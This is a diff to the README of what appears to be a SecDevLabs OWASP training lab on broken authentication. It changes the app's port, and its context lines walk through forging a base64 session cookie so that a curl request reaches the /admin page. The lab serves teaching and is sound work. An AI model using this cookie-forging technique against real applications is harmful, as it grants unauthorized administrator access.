@@ -33,7 +33,7 @@ cd secDevLabs/owasp-top10-2017-apps/a2/saidajaula-monster
 make install
 ```
 
-Then simply visit [localhost:10082][App] ! 😆
+Then simply visit [localhost:10002][App] ! 😆
 
 ## Get to know the app 🏋️‍
 
@@ -50,7 +50,7 @@ Now that you know the purpose of this app, what could go wrong? The following se
 
 #### Insecure session cookie validation allows for privilege escalation
 
-It's possible to reach the server's web application through the HTTP port 10082, as we can see from the image below:
+It's possible to reach the server's web application through the HTTP port 10002, as we can see from the image below:
 
 <p align="center">
     <img src="images/img1.png"/>
@@ -65,7 +65,7 @@ We can sign-up for a new account by clicking the `SIGN UP` button on the top rig
 After creating an account, we are redirected to the `/login` page and, to better understand how the application is handling the requests, we will perform login using the following `curl` command. As shown by the image:
 
 ```sh
-curl -i -L localhost:10082/login -F "username=daniel" -F "password=daniel" -X POST
+curl -i -L localhost:10002/login -F "username=daniel" -F "password=daniel" -X POST
 ```
 
 <p align="center">
@@ -117,7 +117,7 @@ echo -n '{"permissao": 1, "username": "daniel"}.35771d6998cf216aa3297d1fb54462e0
 Now, all an attacker needs to do is try to access the `/admin` only page. As shown by the image below:
 
 ```sh
-curl -v --cookie "sessionId=eyJwZXJtaXNzYW8iOiAxLCAidXNlcm5hbWUiOiAiZGFuaWVsIn0uMzU3NzFkNjk5OGNmMjE2YWEzMjk3ZDFmYjU0NDYyZTA0ZDg1NDQzYmU2MDkyYTAyOTYxYjUyYjI0YzJkMzI1MA==" http://localhost:10082/admin
+curl -v --cookie "sessionId=eyJwZXJtaXNzYW8iOiAxLCAidXNlcm5hbWUiOiAiZGFuaWVsIn0uMzU3NzFkNjk5OGNmMjE2YWEzMjk3ZDFmYjU0NDYyZTA0ZDg1NDQzYmU2MDkyYTAyOTYxYjUyYjI0YzJkMzI1MA==" http://localhost:10002/admin
 ```
 
 <p align="center">
@@ -140,5 +140,5 @@ We encourage you to contribute to SecDevLabs! Please check out the [Contributing
 
 [Docker Install]:  https://docs.docker.com/install/
 [Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://localhost:10082
+[App]: http://localhost:10002
 [Dirb]: https://tools.kali.org/web-applications/dirb
